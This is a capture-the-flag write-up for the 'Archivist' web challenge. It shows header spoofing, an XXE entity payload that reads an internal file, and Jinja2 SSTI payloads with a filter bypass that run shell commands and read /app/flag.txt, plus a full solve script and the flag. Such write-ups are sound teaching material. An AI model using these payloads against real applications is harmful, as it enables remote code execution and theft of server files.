---
title: "Archivist"
ctf: "CyberStrike CTF"
date: 2026-07-11
category: web
difficulty: hard
points: 450
flag_format: "cyberstrike{...}"
author: "retr0"
---

# Archivist

## Summary

A privacy-fixated document portal with three chained layers: a browser/Date header gate, an XXE-vulnerable XML uploader, and a Jinja2 SSTI debug route. The flag is split across two files — `internal/system_manifest.txt` (XXE) and `/app/flag.txt` (SSTI) — and both halves must be combined.

## Solution

### Step 1: Bypass the Header Gate

The root `/` rejects any request missing privacy/legacy headers and redirects to `/rejected`. The `/changelog` page leaks the requirements: a `DNT` header, a legacy `User-Agent` of `ArchiveClient`, and a `Date` header.

The `/collection` route additionally requires the `Date` to fall within the institute's "founding epoch" of 1998:

```
DNT: 1
User-Agent: ArchiveClient/1.0
Date: Wed, 01 Jul 1998 12:00:00 GMT
```

With these headers, `/collection` returns the archive listing and the XML upload form.

### Step 2: XXE to Read `internal/system_manifest.txt` (Flag 1/2)

The upload form POSTs XML to `/collection` and reflects parsed `<title>` back in the response. A constant internal entity works, but `file://`/`http://` SYSTEM entities hang the parser. A **relative path** entity resolves and is reflected back:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE document [
  <!ENTITY xxe SYSTEM "internal/system_manifest.txt">
]>
<document>
  <title>&xxe;</title>
  <author>Test</author>
  <date>1998-01-01</date>
  <content>Hello</content>
</document>
```

The redirect target `/collection?id=<uuid>` renders the entity contents inline, leaking the manifest:

```
[CONFIDENTIAL]
FLAG 1/2: cyberstrike{xxe_p4rs3s_th3_p4st_
```

The manifest also discloses the hidden SSTI route: `/internal/renderer/diagnostic?metadata=`.

### Step 3: SSTI on the Debug Route (Flag 2/2)

`/internal/renderer/diagnostic?metadata=` reflects the parameter directly into a Jinja2 template string (raw concatenation, not a context variable). `{{7*7}}` returns `49`, confirming SSTI.

Filters block direct `open` / `__builtins__` attribute access, but `self.__init__.__globals__.__builtins__.__import__("os").popen(...)` bypasses the filter. First enumerate the filesystem, then read `/app/flag.txt`:

```bash
# SSTI RCE to list /app
PAYLOAD='{{ self.__init__.__globals__.__builtins__.__import__("os").popen("ls /app").read() }}'
ENC=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$PAYLOAD")
curl -s "http://chal.csc-snist.live:56771/internal/renderer/diagnostic?metadata=$ENC" \
  -H "DNT: 1" -H "User-Agent: ArchiveClient/1.0" -H "Date: Wed, 01 Jul 1998 12:00:00 GMT"

# Read the flag file via bracket-access to bypass the "open" keyword filter
PAYLOAD='{{ self.__init__.__globals__.__builtins__["open"]("/app/flag.txt").read() }}'
ENC=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$PAYLOAD")
curl -s "http://chal.csc-snist.live:56771/internal/renderer/diagnostic?metadata=$ENC" \
  -H "DNT: 1" -H "User-Agent: ArchiveClient/1.0" -H "Date: Wed, 01 Jul 1998 12:00:00 GMT"
```

Output:

```
FLAG 2/2: sst1_and_f1l3_r34d}
```

### Complete Solve Script

```python
#!/usr/bin/env python3
import requests
from urllib.parse import quote

TARGET = "http://chal.csc-snist.live:56771"
HEADERS = {
    "DNT": "1",
    "User-Agent": "ArchiveClient/1.0",
    "Date": "Wed, 01 Jul 1998 12:00:00 GMT",
}

# Step 1: pass header gate -> get a session cookie
s = requests.Session()
r = s.get(f"{TARGET}/", headers=HEADERS, timeout=20)
assert r.status_code == 200, "header gate failed"

# Step 2: XXE via relative-path entity -> read internal/system_manifest.txt
xxe = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE document [
  <!ENTITY xxe SYSTEM "internal/system_manifest.txt">
]>
<document>
  <title>&xxe;</title>
  <author>x</author>
  <date>1998-01-01</date>
  <content>x</content>
</document>"""
r = s.post(f"{TARGET}/collection", headers=HEADERS,
           files={"archive_file": ("x.xml", xxe, "text/xml")},
           allow_redirects=True, timeout=30)
import re
m = re.search(r"FLAG 1/2:\s*(cyberstrike\{[^}]+)", r.text)
flag1 = m.group(1)
print("[*] Flag 1/2:", flag1)

# Step 3: SSTI -> read /app/flag.txt
p = '{{ self.__init__.__globals__.__builtins__["open"]("/app/flag.txt").read() }}'
r = s.get(f"{TARGET}/internal/renderer/diagnostic",
          params={"metadata": p}, headers=HEADERS, timeout=20)
m = re.search(r"(sst1_and_f1l3_r34d\})", r.text)
flag2 = m.group(1)
print("[*] Flag 2/2:", flag2)

print("[+] FLAG:", flag1 + flag2)
```

## Flag

```
cyberstrike{xxe_p4rs3s_th3_p4st_sst1_and_f1l3_r34d}
```